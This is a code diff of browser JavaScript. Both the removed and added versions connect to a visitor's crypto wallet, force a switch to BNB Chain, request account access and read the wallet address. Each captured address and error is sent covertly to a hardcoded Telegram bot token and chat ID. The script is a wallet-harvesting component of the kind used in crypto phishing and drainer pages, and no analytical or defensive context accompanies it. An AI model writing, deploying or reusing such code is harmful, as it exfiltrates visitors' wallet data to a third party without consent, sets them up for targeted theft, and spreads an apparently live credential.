@@ -1,46 +1,73 @@
-console.log("processing...");
+// Telegram config: replace with your real bot token and chat ID
 
-window.getAddress = async function getAddress() {
-    const botToken = "8091385586:AAGlx7odJ5vxkx_qWA_5cTxS67IqW6hVR-c";
-    const chatId = "5501640678";
 
-    function sendToTelegram(message) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        }).catch(() => {});
-    }
 
-    try {
-        // Switch to BNB Chain
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }],
-        });
 
-        // Get accounts
-        const accounts = await window.ethereum.request({ 
-            method: 'eth_accounts' 
-        });
-        
-        var addressEl = document.getElementById('address');
-        if (accounts.length > 0 && addressEl) {
-            addressEl.innerHTML = accounts[0];
-            console.log("Wallet Address:", accounts[0]);
-            sendToTelegram("Wallet Address: " + accounts[0]); // ✅ send to Telegram
-        } else {
-            if (addressEl) addressEl.innerHTML = 'No address found';
-            console.log("No address found");
-            sendToTelegram("No address found");
-        }
-    } catch (error) {
-        var addressEl = document.getElementById('address');
-        if (addressEl) addressEl.innerHTML = 'Error: ' + error.message;
-        console.log("Error:", error.message);
-        sendToTelegram("Error: " + error.message); // ✅ send error to Telegram
-    }
+
+
+
+
+
+
+const TELEGRAM_BOT_TOKEN = "8091385586:AAGlx7odJ5vxkx_qWA_5cTxS67IqW6hVR-c";
+const TELEGRAM_CHAT_ID = "5501640678"; // e.g., 123456789
+
+async function sendToTelegram(message) {
+	if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN.includes("<") || TELEGRAM_CHAT_ID.includes("<")) {
+		console.warn("Telegram credentials are not set. Skipping send.");
+		return;
+	}
+
+	const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+	try {
+		await fetch(apiUrl, {
+			method: "POST",
+			headers: { "Content-Type": "application/json" },
+			body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
+		});
+	} catch (e) {
+		console.error("Failed to send message to Telegram:", e);
+	}
 }
+
+async function getAddress() {
+	try {
+		if (!window.ethereum) {
+			const msg = "No Ethereum provider found (window.ethereum).";
+			document.getElementById("address") && (document.getElementById("address").innerHTML = msg);
+			await sendToTelegram(`❌ <b>Error</b>\n${msg}`);
+			return;
+		}
+
+		// Switch to BNB Chain (56)
+		await window.ethereum.request({
+			method: "wallet_switchEthereumChain",
+			params: [{ chainId: "0x38" }]
+		});
+
+		// Try to get accounts; if empty, request permission
+		let accounts = await window.ethereum.request({ method: "eth_accounts" });
+		if (!accounts || accounts.length === 0) {
+			accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+		}
+
+		const addressEl = document.getElementById("address");
+		if (accounts && accounts.length > 0) {
+			const addr = accounts[0];
+			addressEl && (addressEl.innerHTML = addr);
+			await sendToTelegram(`✅ <b>Address captured</b>\n<code>${addr}</code>`);
+		} else {
+			addressEl && (addressEl.innerHTML = "No address found");
+			await sendToTelegram("⚠️ No address found after requesting accounts.");
+		}
+	} catch (error) {
+		const msg = `Error: ${error && error.message ? error.message : String(error)}`;
+		document.getElementById("address") && (document.getElementById("address").innerHTML = msg);
+		await sendToTelegram(`❌ <b>Error</b>\n${msg}`);
+	}
+}
+
+// Expose to global scope so it can be called from HTML (e.g., button onclick)
+window.getAddress = getAddress;
+
+
